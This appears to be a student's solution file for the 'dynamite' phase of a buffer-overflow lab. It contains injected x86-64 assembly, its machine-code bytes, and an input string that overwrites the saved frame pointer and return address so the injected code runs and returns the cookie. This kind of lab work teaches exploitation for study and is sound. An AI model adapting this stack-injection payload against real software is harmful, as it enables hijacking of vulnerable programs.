# address of cookie: 0x602320
# return address of test: 0x400ef3
# %rbp: 0x7fffffffbc30
# %rsp: 0x7fffffffbc00

# instructions for phase 3: dynamite
mov 0x602320, %rax # save return value (cookie) to register rax
movq %rbp, %rsp    # stack pointer points to frame base pointer
subq $0x28, %rsp   # correct position of rsp
pushq $0x400ef3	   # the normal return address
retq

# binary code:
# 48 8b 04 25 20 23 60 00 48 89 ec 48 83 ec 28 68 f3 0e 40 00 c3

# input string (dynamite.txt):
# 48 8b 04 25 20 23 60 00 48 89 ec 48 83 ec 28 68 f3 0e 40 00 c3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 60 bc ff ff ff 7f 00 00 00 bc ff ff ff 7f 00 00
